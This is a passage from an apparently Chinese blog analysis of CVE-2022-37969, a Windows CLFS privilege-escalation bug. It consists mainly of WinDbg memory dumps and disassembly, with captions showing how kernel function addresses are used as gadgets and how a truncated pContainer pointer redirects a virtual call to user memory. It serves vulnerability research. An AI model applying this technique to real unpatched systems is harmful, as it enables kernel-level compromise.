style="color:#ae81ff">28</span> f0 ef<span style="color:#ae81ff">64</span><span style="color:#ae81ff">8</span>d a4 ff ff<span style="color:#f92672">-</span>d6<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> (..d............</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff020<span style="color:#ae81ff">2</span>a f0 ef<span style="color:#ae81ff">64</span><span style="color:#ae81ff">8</span>d a4 ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>a<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">*</span>..d....Z.......</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff030<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff040<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff050<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff060<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffa48d<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">64</span>eff070<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span></code></pre></div><p>将系统EPROCESS进行异或后存到栈上的地址中</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/9.png"/></p><p>将41414141写到0x100000007的内存地址上</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/10.png"/></p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/11.png"/></p><p>获取到<code>SeSetAccessStateGenericMapping</code>函数地址</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/12.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u fffff8046b3f2da0</span></span><span style="display:flex;"><span>nt<span style="color:#f92672">!</span>SeSetAccessStateGenericMapping:</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2da0<span style="color:#ae81ff">488</span>b4148 mov rax,qword ptr [rcx<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h]</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2da4<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">1002</span> movups xmm0,xmmword ptr [rdx]</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2da7 f30f7f4008 movdqu xmmword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>],xmm0</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2dac c3 ret</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2dad cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2dae cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2daf cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>b3f2db0 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span></code></pre></div><p>获取<code>ClfsEarlierLsn</code>的内核地址</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/13.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u FFFFF8046A9F1CB0</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cb0<span style="color:#ae81ff">488</span>b05c1240000 mov rax,qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_INVALID</span> (fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f4178)]</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cb7<span style="color:#ae81ff">4885</span>c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cba<span style="color:#ae81ff">7436</span> je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cf2)</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cbc<span style="color:#ae81ff">488</span>b09 mov rcx,qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cbf<span style="color:#ae81ff">483</span>b0d82210000 cmp rcx,qword ptr [CLFS<span style="color:#f92672">!</span><span style="color:#a6e22e">CLFS_LSN_NULL</span> (fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f3e48)]</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cc6<span style="color:#ae81ff">742</span>a je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cf2)</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cc8<span style="color:#ae81ff">483</span>bc8 cmp rcx,rax</span></span><span style="display:flex;"><span>fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1ccb<span style="color:#ae81ff">7425</span> je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6</span>a9f1cf2)</span></span></code></pre></div><p>把两个函数布局到0x500008和0x500018上</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/14.png"/></p><p>触发漏洞<code>pContainer</code>指针高5位被清零，指针指向0x593a0，该地址为用户层内存地址。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd070<span style="color:#ae81ff">06</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">69</span> be<span style="color:#ae81ff">23</span> a9<span style="color:#ae81ff">92</span><span style="color:#ae81ff">15</span> ee<span style="color:#ae81ff">11</span> ........i.<span style="color:#960050;background-color:#1e0010">#</span>.....</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd080 bc<span style="color:#ae81ff">80</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">0</span>c<span style="color:#ae81ff">29</span><span style="color:#ae81ff">07</span> fc<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....).<span style="color:#ae81ff">.2</span>........</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd090<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd0a0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">38</span><span style="color:#ae81ff">13</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> .......<span style="color:#ae81ff">.8</span>.......</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd0b0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd0c0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd0d0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>dd0e0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">-</span><span style="color:#ae81ff">0x11000</span></span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc070<span style="color:#ae81ff">01</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>b<span style="color:#ae81ff">21</span><span style="color:#ae81ff">72</span> e4<span style="color:#ae81ff">7f</span><span style="color:#ae81ff">15</span> ee<span style="color:#ae81ff">11</span> ........<span style="color:#f92672">+!</span>r.....</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc080 bc<span style="color:#ae81ff">7f</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">0</span>c<span style="color:#ae81ff">29</span><span style="color:#ae81ff">07</span> fc<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....).<span style="color:#ae81ff">.2</span>........</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc090<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc0a0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc0b0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc0c0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">38</span><span style="color:#ae81ff">13</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> .......<span style="color:#ae81ff">.8</span>.......</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc0d0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>cc0e0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1468</span></span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4d8<span style="color:#ae81ff">08</span> f0 fd c1<span style="color:#ae81ff">30</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#ae81ff">.0</span>...........</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4e8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>a0<span style="color:#ae81ff">93</span><span style="color:#ae81ff">50</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ..........P.....</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de4f8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de508<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de518<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de528<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de538<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">276</span>de548<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span></code></pre></div><p>获取<code>pContainer</code>指针，并尝试解引用pContainer获取到<code>CClfsContainer</code>对象，而后调用对象的指针</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/15.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ebf<span style="color:#ae81ff">498</span>b7f18 mov rdi, qword ptr [r15<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ec3<span style="color:#ae81ff">4885ff</span> test rdi, rdi</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ec6<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">84</span>b9000000 je CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d5</span> (fffff80011306f85)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ecc<span style="color:#ae81ff">4983671800</span> and qword ptr [r15<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h],<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>ed1<span style="color:#ae81ff">65488</span>b142588010000 mov rdx, qword ptr gs:[<span style="color:#ae81ff">188</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">11306</span>eda<span style="color:#ae81ff">488</span>b4e20 mov rcx, qword ptr [rsi<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span 